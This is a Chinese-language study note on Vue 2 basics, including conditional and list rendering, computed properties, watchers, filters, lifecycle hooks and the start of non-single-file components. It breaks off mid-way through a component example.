### 		style样式

对象写法    :style="{fontSize: xxx}"  其中xxx是动态值。
数组写法    :style="[a,b]"   其中a、b是样式对象。

```html
<div id="root">
    <!-- 绑定style样式，对象写法 -->
	<div class="basic" :style="[styleObj1,styleObj2]">{{name}}</div>
	<!-- 绑定style样式，数组写法 -->
	<div class="basic" :style="styleArr">{{name}}</div>
<div/>
<script type="text/javascript">
	Vue.config.productionTip = false 
	const vm = new Vue({
		el: '#root',
		data: { name: 'YZling' },
		styleObj1: { fontSize: '40px',color: 'red'},
		styleObj2: { backgroundColor: 'yellow' },
		styleArr: [
 			{ fontSize: '40px', color: 'red'},
 			{ backgroundColor: 'yellow' }
   		]
	})
</script> 
```

```css
.basic {
    width: 400px;
    height: 100px;
    border: 1px solid black;
}
```



------

## 条件·列表·渲染

------

### 	条件渲染

#### v-if

(1).v-if="表达式" 
(2).v-else-if="表达式"
(3).v-else="表达式"
适用于：切换频率较低的场景。
特点：不展示的DOM元素（不满足判定条件）直接被移除。

注意：

1. v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
2. template标签不会影响DOM节点，但只能配合v-if

```html
<div id="root">
    <h3>n的值{{n}}</h3>
    <button @click="n++">n + 1</button> <br>
	<button @click="n=0">n = 0</button>
    
    <h1 v-if="1 == 0">你好，{{name}}</h1>
    
    <!-- v-else和v-else-if 不能打断 -->
	<div v-if="n === 2">lty_2</div>
	<div v-else-if="n === 2">xc_3</div>
	<div v-else-if="n === 4">xc_4</div>
	<div v-else>xc_5</div>
    
    <!-- template 不会影响DOM节点 但只能配合v-if -->
	<template v-if="n==1">
        <h1>yxl</h1>
    	<h1>lty</h1>
    	<h1>xc</h1>
	</template>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false
    new Vue({
    el: '#root',
    data: {
        name: 'YZling',
        n: 0,
    }
	})
</script>
```

------

#### v-show

v-show写法：v-show="表达式"
适用于：切换频率较高的场景。
特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉（style="display:none"）。

```html
<div id="root">
    <h3>n的值{{n}}</h3>
    <button @click="n++">n + 1</button> <br>
	<button @click="n=0">n = 0</button>
    
    <!-- 使用v-show条件渲染: style="display:none"-->
     <h1 v-show="false">你好，{{name}}</h1>
     <h1 v-show="1 == 0">你好，{{name}}</h1>
    
    <!-- 切换频繁用v-show  ,  v-if要操作节点 -->
	<div v-show="n === 1">yzl_1</div>
	<div v-show="n === 2">lty_2</div>
	<div v-show="n === 2">xc_3</div>  
</div>
<script type="text/javascript">
	Vue.config.productionTip = false
    new Vue({
    el: '#root',
    data: {
        name: 'YZling',
        n: 0,
    }
	})
</script>
```

------

#### 区别

1.v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”（中间不能有其他标签）v-show是不能这样的

2.使用v-if的时，DOM元素可能无法获取到（因为元素移除了），而使用v-show一定可以获取到（只是显示与隐藏）。

3.v-if切换频率较低的场景 ,v-show切换频率较高的场景



------

### 列表渲染

------

#### 基本列表

##### 遍历数组

```html
<div id="root">
    <!-- 遍历数组 -->
    <h2>演唱信息</h2>
    <ul>
        <li v-for="(v,index) of Vsinger" :key="index">
            {{v.name}}-{{v.sing}}
        </li>
    </ul>
    <hr>
    <ul>
         <li v-for="v in Vsinger" :key="v.id">
            {{v.name}}-{{v.sing}}
        </li>
    </ul>
    <hr>
    <ul>
        <li v-for="(v,index) in Vsinger">
            {{v.name}}-{{v.sing}}
        </li>
    </ul>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false
    const v = new Vue({
        el: '#root',
        data: {
            Vsinger: [
                { id: '001', name: 'yzl', sing: '藏蓝' },
                { id: '002', name: 'lty', sing: '达拉崩吧' },
                { id: '003', name: 'xc', sing: '涟漪' },
            ],
        }
    })
</script>

```



##### 遍历对象

```html
<div id="root">
	<!-- 遍历对象 -->
	<h2>代表色</h2>
	<ul>
    	<!-- 顺序一定是value,key -->
    	<li v-for="(value,key) of color" :key="key">
        	{{key}}-{{value}}
    	</li>
	</ul>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false
    const v = new Vue({
        el: '#root',
        data: {
           color: {
                    yzl: 'red',
                    lty: 'blue'
           },
        }
    })
</script>
```



##### 遍历字符串

```html
<div id="root">
	<!-- 遍历字符串 -->
	<h2>遍历字符串</h2>
	<ul>
    	<!-- 顺序一定是value,key -->
    	<li v-for="(char,index) of str" :key="index">
       		{{index}}-{{char}}
    	</li>
	</ul>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false
    const v = new Vue({
        el: '#root',
        data: {
           str: 'hello'
        }
    })
</script>
```



##### 遍历指定次数

```html
<div id="root">
	<!-- 遍历指定次数 -->
	<h2>遍历字符串</h2>
	<ul>
    	<!-- 顺序一定是value,key -->
    	<li v-for="(number,index) of 6" :key="index">
        	{{index}}-{{number}}
    	</li>
	</ul>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false
    const v = new Vue({
        el: '#root',
        data: {
     
        }
    })
</script>
```



------

### 	key作用与原理

**react、vue中的key有什么作用？（key的内部原理）**

1. **虚拟DOM中key的作用**：
	key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
	随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：					
2. **对比规则**：
   	(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
   		①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
   		②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
       (2).旧虚拟DOM中未找到与新虚拟DOM相同的key:
           ①.创建新的真实DOM，随后渲染到到页面。

3. **用index作为key可能会引发的问题**：
	1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
		 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
	2. 如果结构中还包含输入类的DOM：
		 会产生错误DOM更新 ==> 界面有问题。
4. **开发中如何选择key?**
	1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
	2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
	  使用index作为key是没有问题的。

```html
<!-- 使用index作为key，顺序或逆序插入输入框和列表不绑定 -->
<div id="root">
    <!-- 遍历数组 -->
    <h2>演唱信息(遍历数组)</h2>
    <button @click.once="add">添加一个演唱信息</button>
    <ul>
        <!-- 使用index作为key，顺序或逆序插入输入框和列表不绑定 -->
        <!-- <li v-for="(v,index) of vsinger" :key="index"> -->
        <li v-for="(v,index) of vsinger" :key="v.id">
            {{v.name}}-{{v.sing}}<input type="text">
        </li>
    </ul>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    const v = new Vue({
        el: '#root',
        data: {
            vsinger: [
                { id: '001', name: 'yzl', sing: '藏蓝' },
                { id: '002', name: 'lty', sing: '达拉崩吧' },
                { id: '003', name: 'xc', sing: '涟漪' },
            ]
        },
        methods: {
            add() {
                const v = { id: '004', name: 'yzl&xh', sing: '大时代' }
                this.vsinger.unshift(v)
            }
        }
    })
</script>
```

------

### 列表过滤

输入姓名模糊搜索

#### watch实现

```html
<div id="root">
    <h2>演唱信息</h2>
    <input type="text" v-model="keyWord" placeholder="输入搜素信息">
    <ul>
        <li v-for="(v,index) of filVsinger" :key="v.id">
            {{v.name}}-{{v.sing}}-{{v.gender}}
        </li>
    </ul>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false 
    new Vue({
        el: '#root',
        data: {
            keyWord: '',
            vsinger: [
                { id: '001', name: 'yzl', sing: '藏蓝', gender: '女', hot: '1' },
                { id: '002', name: 'lty', sing: '达拉崩吧', gender: '女', hot: '2' },
                { id: '003', name: 'xc', sing: '涟漪', gender: '女', hot: '3' },
                { id: '004', name: 'yzly', sing: '余火', gender: '男', hot: '4' }
            ],
            filVsinger: []
        },
        // watch实现
    	watch: {
       		keyWord: {
           		immediate: true,
           		handler(val) {
               		this.filVsinger = this.vsinger.filter((v) => {
                   		return v.name.indexOf(val) !== -1;
               		})
           		}
       		}
   		}
	})
</script>
```

#### computed实现

```html
<div id="root">
    <h2>演唱信息</h2>
    <input type="text" v-model="keyWord" placeholder="输入搜素信息">
    <ul>
        <li v-for="(v,index) of filVsinger" :key="v.id">
            {{v.name}}-{{v.sing}}-{{v.gender}}
        </li>
    </ul>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false 
    new Vue({
        el: '#root',
        data: {
            keyWord: '',
            vsinger: [
                { id: '001', name: 'yzl', sing: '藏蓝', gender: '女', hot: '1' },
                { id: '002', name: 'lty', sing: '达拉崩吧', gender: '女', hot: '2' },
                { id: '003', name: 'xc', sing: '涟漪', gender: '女', hot: '3' },
                { id: '004', name: 'yzly', sing: '余火', gender: '男', hot: '4' }
            ]
        },
        // 计算属性实现
        computed: {
            filVsinger() {
                return this.filVsinger = this.vsinger.filter((v) => {
                    return v.name.indexOf(this.keyWord) !== -1;
                })
            }
        },
    })
</script>
```

------

### 列表排序

默认顺序、倒序、顺序

```html
<div id="root">
    <h2>演唱信息</h2>
    <input type="text" v-model="keyWord" placeholder="输入搜素信息">
    <button @click="sortType = 2">降序</button>
    <button @click="sortType = 1">升序</button>
    <button @click="sortType = 0">默认</button>
    <ul>
        <li v-for="(v,index) of filVsinger" :key="v.id">
            {{v.hot}}-{{v.name}}-{{v.sing}}-{{v.gender}}
        </li>
    </ul>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    new Vue({
        el: '#root',
        data: {
            keyWord: '', // 模糊搜索关键字
            vsinger: [
                { id: '001', name: 'yzl', sing: '藏蓝', gender: '女', hot: '412' },
                { id: '002', name: 'lty', sing: '达拉崩吧', gender: '女', hot: '233' },
                { id: '003', name: 'xc', sing: '涟漪', gender: '女', hot: '333' },
                { id: '004', name: 'yzly', sing: '余火', gender: '男', hot: '666' }
            ],
            sortType: 0 // 0默认顺序  1升序  2降序
        },
        // 计算属性实现
        computed: {
            filVsinger() {
                const arr =  this.vsinger.filter((v) => {
                    return v.name.indexOf(this.keyWord) !== -1;
                })
                
                // 排序
                if (this.sortType) {
                    arr.sort((v1, v2) => {
                        return this.sortType === 1 ? v2.hot - v1.hot : v1.hot - v2.hot;
                    })
                }
                return arr;
            }
        }
    })
</script>
```

### 列表更新

更行列表信息，vue没监测到。
页面不显示原因：

1. 只有用数组方法改变了原数组才会响应 。
2. 这些方法都是经过Vue包装的，不是数组原本的方法。
3. Vue.set()也可以改变数组实现响应式。

```html
<div id="root">
    <h2>演唱信息</h2>
    <button @click="updatLing">更新yzl信息</button>
    <ul>
        <li v-for="(v,index) of vsinger" :key="v.id">
            {{v.hot}}-{{v.name}}-{{v.sing}}-{{v.gender}}
        </li>
    </ul>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false 
    const vm = new Vue({
        el: '#root',
        data: {
            vsinger: [
                { id: '001', name: 'yzl', sing: '藏蓝', gender: '女', hot: '412' },
                { id: '002', name: 'lty', sing: '达拉崩吧', gender: '女', hot: '233' },
                { id: '003', name: 'xc', sing: '涟漪', gender: '女', hot: '333' },
                { id: '004', name: 'yzly', sing: '余火', gender: '男', hot: '666' }
            ]
        },
        methods: {
            updatLing() {
                // this.vsinger[0].hot = 1314; // 有效
                // this.vsinger[0].sing = '梦语'; // 有效
               
                // 页面不显示，vue没有监测到
                // this.vsinger[0] = { id: '001', name: 'yzl', sing: '梦语', gender: '女', hot: '1314' } 
                
                this.vsinger.splice(0, 1, { id: '001', name: 'yzl', sing: '梦语', gender: '女', hot: '1314' })
            }
        }
    })
</script>
```

#### 添加一个响应式属性

```html
<div id="root">
	<button @click="addSex">男的女的？</button>
	<h2>Vsing_name:{{yzl.name}}</h2>
	<h2>Vsinger_sing:{{yzl.color}}</h2>
	<h2 v-if="yzl.sex">Vsinger_sex:{{yzl.sex}}</h2>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false
	const vm = new Vue({
		el: '#root',
		data: {
			yzl: {
				name: 'yzl',
				color: '#EE0000'
			}
		},
		methods: {
			// 操作对象不能是Vue实例vm，或者Vue实例的根数据：data
			addSex() {
				Vue.set(this.yzl, 'sex', '女'); // Vue提供的set()
				this.$set(this.yzl, 'sex', '女'); // data提供的set()
			}
		}
	})
</script>
```



------

## 	计算属性

​		实现 **歌手-歌曲**格式的列表

### 插值语法实现

```html
<div id="root">
    歌手名：<input type="text" v-model="vSinger"> <br>
    歌曲名：<input type="text" v-model="song"> <br><br>
    歌曲信息：<span>{{vSinger.slice(0,3)}}-{{song}}</span> <br>
    歌曲信息：<span>{{vSinger.slice(0,3)}}-{{song}}</span> <br>
    歌曲信息：<span>{{vSinger.slice(0,3)}}-{{song}}</span> <br>
    歌曲信息：<span>{{vSinger.slice(0,3)}}-{{song}}</span> <br>
    歌曲信息：<span>{{vSinger.slice(0,3)}}-{{song}}</span>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false 
    const v = new Vue({
        el: '#root',
        data: {
            vSinger: '绫',
            song: '藏蓝'
        }
    })
</script>
```

### methods实现

```html
<div id="root">
    歌手名：<input type="text" v-model="vSinger"> <br>
    歌曲名：<input type="text" v-model="song"> <br><br>
    歌曲信息：<span>{{songInfo()}}</span> <br>
    歌曲信息：<span>{{songInfo()}}</span> <br>
    歌曲信息：<span>{{songInfo()}}</span> <br>
    歌曲信息：<span>{{songInfo()}}</span> <br>
    歌曲信息：<span>{{songInfo()}}</span>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false
    const v = new Vue({
        el: '#root',
        data: {
            vSinger: '绫',
            song: '藏蓝'
        },
        methods: {
            songInfo() {
                return this.vSinger + '-' + this.song
            }
        }
    })
    </script>
```

### computed实现

1.定义：要用的属性不存在，要通过已有属性计算得来。
2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
3.get函数什么时候执行？
	(1).初次读取时会执行一次。
	(2).当依赖的数据发生改变时会被再次调用。
4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
5.备注：
	1.计算属性最终会出现在vm上，直接读取使用即可。
	2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。

```html
<div id="root">
    歌手名：<input type="text" v-model="vSinger"> <br>
    歌曲名：<input type="text" v-model="song"> <br><br>
    <!-- 计算属性 -->
    歌曲信息：<span>{{songInfo}}</span> <br>
    歌曲信息：<span>{{songInfo}}</span> <br>
    歌曲信息：<span>{{songInfo}}</span> <br>
    歌曲信息：<span>{{songInfo}}</span> <br>
    <!-- methods -->
    歌曲信息：<span>{{songInfo()}}</span>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false
    const v = new Vue({
        el: '#root',
        data: {
            vSinger: '绫',
            song: '藏蓝'
        },
        /*methods: {
            songInfo() {
                return this.vSinger + '-' + this.song
            }*/
        },
        computed: {
    		//song information
    		songInfo: {
        		//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
        		//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
        		get() {
            		return this.vSinger + '-' + this.song;
        		},
        		//set什么时候调用? 当fullName被修改时。
        		set(value) {
            		const arr = value.split('-');
            		this.vSinger = arr[0];
           			this.song = arr[1];
        		}
    		}
		}
    })
    </script>
```

#### 简写

1. 计算属性简写**只适用于 getter 函数**，不适用于 setter 函数。
2. 计算属性简写**只能接受一个返回值**，如果需要返回多个值，需要使用完整的计算属性语法。
3. 计算属性简写**不能与 `watch` 监听器混淆使用**，因为它们的语法非常相似。如果需要在值变化时执行异步或开销较大的操作，应该使用 `watch` 监听器而不是计算属性简写。
4. 计算属性简写**不能使用函数的参数**，因为无法在简写语法中传递参数。如果需要使用参数，需要使用完整的计算属性语法。
5. 计算属性简写**不能在组件的选项外部使用**，只能在组件选项内部使用。如果需要在组件选项外部定义计算属性，需要使用完整的计算属性语法。

```html
<div id="root">
    歌手名：<input type="text" v-model="vSinger"> <br>
    歌曲名：<input type="text" v-model="song"> <br><br>
    <!-- 计算属性 -->
    歌曲信息：<span>{{songInfo}}</span> <br>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false
    const v = new Vue({
        el: '#root',
        data: {
            vSinger: '绫',
            song: '藏蓝'
        },
        computed: {
            /* setTimeout(() => {
					// 返回值不能给fullName，计算属性实现 异步计算不适用
					return this.firstName + '-' + this.lastName
				}, 1000) */
    		//song information
    		songInfo() {
            		return this.vSinger + '-' + this.song
    		}
		}
    })
    </script>
```



------

## 	监视属性

切换季节显示案例

### methods实现

Data中定义了一个响应式变量，而这个响应式变量的状态是通过一个函数来返回的，返回的状态结果要显示在DOM中，而这个函数的内部是一个循环，这就导致页面一直在加载无限循环下去，没有终止，卡死。

```html
<div id="root">
	<h2>{{isSeason ? '春天' : '冬天'}}到了</h2>
    <!-- <h2>{{changeSeason()}}到了</h2> -->
	<button @click="changeSeason">切换季节</button>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false 
	new Vue({
    el: '#root',
    data: {
        isSeason: true
    },
    methods: {
        changeSeason() {
            return this.isSeason = !this.isSeason
            
            // this.isSeason = !this.isSeason
		   // return isSeason ? '春天' : '冬天'
        } 
    }
})
</script>
```

### computed实现

```html
<div id="root">
	<h2>{{info}}到了</h2>
	<button @click="isSeason =! isSeason">切换季节</button>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false 
	new Vue({
    el: '#root',
    data: {
        isSeason: true
    },
    computed: {
		info() {
			return this.isSeason ? '春天' : '冬天'
         }
	},
})
</script>
```

### watch监视属性

监视属性watch：

​	1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作。
​	2.监视的属性必须存在，才能进行监视。
​	3.监视的两种写法：
​		(1).new Vue时传入watch配置。
​		(2).通过vm.$watch监视。

注意事项：

1. 回调函数handler不可自定义函数名。
2. 可以监视计算属性。

```html
<!-- 
	监视isSeason属性:
	点击按钮，触发methods中的方法，修改isSeason属性，
	computed中依赖的属性isSeason被修改，调用set需修改计算属性
	显示到页面
-->
<div id="root">
	<h2>{{info}}到了</h2>
	<button @click="changeSeason">切换季节</button>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    const vm = new Vue({
        el: '#root',
        data: {
            isSeason: true
        },
        computed: {
            info() {
                return this.isSeason ? '春天' : '冬天'
            }
        },
        methods: {
            changeSeason() {
                return this.isSeason = !this.isSeason
            }
        },
        watch: {
              isSeason: {
                  // 默认false , 初始化时让handler调用一下
                  immediate: true,
                  // handler被调用？当isSeason发生改变
                  handler(newValue, oldValue) {
                      console.log('isSeason被修改', newValue+'to'+oldValue)
                  }
              }
          } 
})
</script>
```

```javascript
vm.$watch('isSeason', {
    // 默认false , 初始化时让handler调用一下
    immediate: true,
    // handler被调用？当isSeason发生改变
    handler(newValue, oldValue) {
        console.log('isSeason被修改', newValue, oldValue)
    }
})
```

### deep深度监视

watch: 默认不监测多级结构对象里面任意属性的改变。
deep: 深度监视，默认false。开启深度监视，多级结构数据中的任何属性变化都会触发回调函数。

注意事项：

1. Vue自生可以检测对象内部值的改变，但Vue提供的watch默认不可以。
2. 使用watch时根据数据具体结构，决定是否使用深度监视
3. 监视某个复杂数据，如果没有选择监视这个复杂数据具体某个属性，而是开启深度监视一个结构复杂数据，虽然可以监测到这个复杂数据值的改变，但是不能确定newValue和oldValue。（newValue, oldValue都为最新的值）

```html
<div id="root">
    <h3>a的值是:{{numbers.a}}</h3>
    <button @click="numbers.a++">a++</button>
    <h3>a的值是:{{numbers.b}}</h3>
    <button @click="numbers.b++">b++</button>
    <!-- 未开启deep实现监视numbers这个对象（替换numbers这个对象） -->
    <button @click="numbers={a:123}">numbers替换</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false 
    const vm = new Vue({
        el: '#root',
        data: {
            numbers: {
                a: 1,
                b: 1
            }
        },
        watch: {
            // 监视多级结构某个属性的变化
            'numbers.a': {
                 handler() {
                     console.log('a变了')
                 }
             },
            // 深度监视多级结构：可以监视深层次属性值的改变
            'numbers': {     
                deep: true, // deep 深度监视 默认false
                handler() {
                    console.log('numbers变了')
                }
            },
        }
    })
</script>
```

### 简写

简写不能配置内置属性

```html
<!-- 简写不能配置内置属性 -->
<div id="root">
	<h2>{{info}}到了</h2>
	<button @click="changeSeason">切换季节</button>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false 
    const vm = new Vue({
        el: '#root',
        data: {
            isSeason: true,
        },
        computed: {
            info() {
                return this.isSeason ? '春天' : '冬天'
            }
        },
        methods: {
            changeSeason() {
                return this.isSeason = !this.isSeason
            }
        },
        watch: {
             // 简写
             isSeason(newValue, oldValue) {
                 console.log('isSeason被修改', newValue, oldValue)
             }
        }
    })

</script>
```

```javascript
// 简写
vm.$watch('isSeason', function (newValue, oldValue) {
	console.log('isSeason被修改', newValue, oldValue)
})
```



## 	过滤器

定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
语法：
	1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
	2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
备注：
	1.过滤器也可以接收额外参数、多个过滤器也可以串联
	2.并没有改变原本的数据, 是产生新的对应的数据

例子：**实现日期格式化输出**

```html
<!-- 引入day.js -->
<script type="text/javascript" src="../js/day.js"></script>
```

### computed实现

```html
<div id="root">
    <h1>你好，{{name}}</h1>
    <!-- 计算属性computed实现 -->
    <h3>计算属性：{{formtTime}}</h3>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false 
    new Vue({
        el: '#root',
        data: {
            name: 'YZling',
            time: 1673573789094
        },
        computed: {
            formtTime() {
                // 返回指定日期
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss ')
                // 返回今天日期
                // return dayjs().format('YYYY年MM月DD日 HH:mm:ss ')
            }
        },
       
    })
</script>
```

### methods实现

```html
<div id="root">
    <h1>你好，{{name}}</h1>
    <!-- 方法methods实现 -->
    <h3>方法：{{getFmtTime()}}</h3>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            name: 'YZling',
            time: 1673573789094
        },
        methods: {
            getFmtTime() {
                // 返回指定日期
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss ')
            }
        }
    })
</script>
```

### filters实现

#### 局部过滤器

```html
<div id="root">
    <h1>你好，{{name}}</h1>
    <!-- 过滤器filters实现 -->
    <h3>过滤器：{{time | timeFormater('YYYY年MM月DD日')}}</h3>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            name: 'YZling',
            time: 1673573789094
        },
        // 局部过滤器
        filters: {
            timeFormater(val, str = 'YYYY年MM月DD日 HH:mm:ss') {
                // return dayjs(val).format('YYYY年MM月DD日 HH:mm:ss')
                return dayjs(val).format(str)
            }
        }
    })
</script>
```

#### 全局过滤器

```html
<div id="root">
    <h1>你好，{{name}}</h1>
    <!-- 方法methods实现 -->
    <h3>过滤器：{{time | timeFormater | myFilters}}</h3>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false
    // 全局过滤器
	Vue.filter('myFilters', function (val) {
        // 过滤器实现截取字符串只输出年份
    	return val.slice(0, 4)
	})
    
    new Vue({
        el: '#root',
        data: {
            name: 'YZling',
            time: 1673573789094
        },
        // 局部过滤器
		filters: {
    		timeFormater(val, str = 'YYYY年MM月DD日 HH:mm:ss') {
        		// return dayjs(val).format('YYYY年MM月DD日 HH:mm:ss')
        		return dayjs(val).format(str)
    		}
		}
    })
</script>
```

------

# Vue的生命周期

## vue2.x 生命周期八个阶段

1. `beforeCreate`：实例刚刚被创建，此时数据观测和初始化事件还未开始，无法访问到 `props`, `data`, `methods`, `computed` 等。
2. `created`：实例已经被创建，此时可以访问到 `props`, `data`, `methods`, `computed` 等，但是尚未挂载到页面上。
3. `beforeMount`：实例已经完成了模板编译，并将模板中的数据渲染到了真实的 DOM 节点上，但是此时还未被挂载到页面上。
4. `mounted`：实例已经被挂载到页面上，此时可以访问到真实的 DOM 元素，可以进行一些 DOM 操作，如添加事件监听器等。
5. `beforeUpdate`：当实例的数据发生改变时，此函数将在数据更新之前被调用。
6. `updated`：当实例的数据发生改变时，此函数将在数据更新之后被调用。此时 DOM 已经被更新，可以执行一些操作，如更新计算属性等。
7. `beforeDestroy`：实例将要被销毁时调用。在这里可以进行一些清理工作，如移除事件监听器、取消定时器等。
8. `destroyed`：实例已经被销毁，此时所有的事件监听器和定时器都已被销毁，所有的子组件也已经被销毁。

------

## 挂载

**什么是挂载**：挂载流程是将组件渲染成真实的 DOM 并将其插入到页面中的过程。

**挂载流程**：

1. 解析模板：Vue.js 会解析组件模板中的 HTML 代码，并将其转换为虚拟 DOM 树。
2. 创建组件实例：Vue.js 会根据组件定义创建组件实例，实例化时会执行组件的生命周期钩子函数 `beforeCreate` 和 `created`。4
3. 编译模板：Vue.js 会将虚拟 DOM 树和组件的数据进行编译，生成渲染函数。
4. 执行渲染函数：Vue.js 会执行渲染函数，将虚拟 DOM 转换为真实的 DOM。
5. 将 DOM 插入页面：Vue.js 将生成的真实 DOM 插入到页面中，并执行组件的生命周期钩子函数 `mounted`。

------

## 例子（挂载流程）

```html
<!-- 实现打点击call(hot+1)显示，在生命周期销毁此功能，看是否丧失打call功能 -->
<!-- 
    1. 初始化(beforeCreat、created)
    3. 挂载(beforeMount、【mounted】)
    2. 更新(beforeUpdate、updated)
    3. 销毁(【beforeDestroy】、destroyed)
 -->
<div id="root">
    <h1 v-text="hot"></h1>
    <h2 :style="{opacity}">{{name}}的热度{{hot}}</h2><br>
    <button @click="add">打call!!</button>
    <button @click="delVm">毁灭吧这个世界!!</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    new Vue({
        el: '#root',
        // template:`
        // 	<div>
        // 		<h2>当前的hot值是：{{hot}}</h2>
        // 		<button @click="add">点我hot+1</button>
        // 	</div>
        // `,
        data: {
            name: 'YZling',
            hot: 1,
            opacity: 1
        },
        methods: {
            add() {
                console.log('add')
                this.hot++
            },
            delVm() {
                // 完全销毁一个实例、清理它与其它实例的连接，解绑它的全部指令及事件侦听器(旧
自定义事件)
                console.log('毁灭吧这个世界!!!') // 旧版本销毁了，还能执行
                this.$destroy()
            }
        },
        watch: {
            hot() {
                console.log('hot变了')
            }
        },
        // 生命周期流程
        // 1. 初始化：生命周期、事件、
        beforeCreate() {
            // 此时无法通过vm访问到data中数据、methods中的方法
            console.log('beforeCreate')
            // debugger;
        },
        // 2. 初始化：数据检测、数据代理
        created() {
            // 此时：可以通过vm访问到data中数据、methods中的方法
            console.log('created')
            // debugger;
        },
        // 3. Vue开始解析模板，内存中生成虚拟DOM,页面无法显示解析好内弄
        beforeMount() {
            // 此时：1.页面呈现未经Vue解析的DOM结构。2.操作的DOM最后都无法实现
            console.log('beforeMount')
        },
        // 4. Vue将内存中的虚拟DOM转为真实Dom放入页面(挂载完毕)
        mounted() {
            /**
             * 此时：1.该函数调只用一次。2.页面呈现未经Vue编译的DOM 
             * 3.对DOM的操作都可实现（但违背了Vue初衷：不直接操作DOM）
             * 4.至此初始化结束
             * 5.一般：开启定时器、发送网络请求、订阅消息、绑定自定义事件、等初始化操作
             */
            console.log('mounted')
            // 一闪一闪效果
            /* setInterval(() => {
                this.opacity -= 0.01
                if (this.opacity <= 0) {
                    this.opacity = 1
                }
            }) */
        },
        // 5.WHEN DATA CHANGES
        beforeUpdate() {
            // 此时：数据是新的，但页面是旧的
            console.log('beforeUpdate')
        },
        // 6. 根据新数据生成新的虚拟DOM，与旧的比对，完成更新
        updated() {
            // 此时数据是新的，页面也是
            console.log('updated')
        },
        // 7. WHEN vm.$destroy() is called
        beforeDestroy() {
            // 销毁之前vm所有都可用
            // 此时可以：关闭定时器、取消订阅消息、解绑自定义事件等
            // 数据修改不触发更新（不能在往上执行生命周期）
            console.log('beforeDestroy')
        },
        // 8. 移除 watchea、child components、event listeners
        destroyed() {
            // 此时：没人鸟这里
            console.log('destroyed')
        }
    })
</script>
```

## nextTick

nextTick(callback(){}):当修改数据时，vue操作修改页面后，vue才调用这个函数

------

# 组件模块

------

## 	非单文件组件

### 基本使用

------

#### 要点

**Vue中使用组件的三大步骤**：
    	一、定义组件(创建组件)
    	二、注册组件
	    三、使用组件(写组件标签)

**一、如何定义一个组件？**
		使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
		区别如下：
			1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
			2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
		备注：使用template可以配置组件结构。

**二、如何注册组件？**
		1.局部注册：靠new Vue的时候传入components选项。
		2.全局注册：靠Vue.component('组件名',组件)。

**三、编写组件标签：**
		<vsinger1></vsinger1>

------

#### 结构

```html
<html>
<head>
    <title>Document</title>
    <!-- 引入vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <!-- 3. 组件标签 -->
    </div>
    <hr>
    <div id="root2">
	   <!-- 3. 组件标签 -->
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false 
        // 1. 定义组件
        
        // 2.1 局部注册组件
        
        // 2.2 全局注册组件

    </script>
</body>
</html>
```



#### 1. 定义组件

##### 定义子组件yzl

```javascript
const yzl = Vue.extend({
    // el: '#root', // 不能写
    template: `
      <div>
          <h2>{{name}}</h2>
          <button @click="showNameColor">{{color}}</button>
      </div>
      `,
    data() {
        return {
            name: '乐正绫',
            color: 'red'
        }
    },
    methods: {
        showNameColor() {
            alert(this.name + '-' + this.color)
        }
    },
})
```

##### 定义子组件lty

```javascript
// 1. 定义组件
const lty = Vue.extend({
    template: `
    <div>
        <h2>{{name}}</h2>
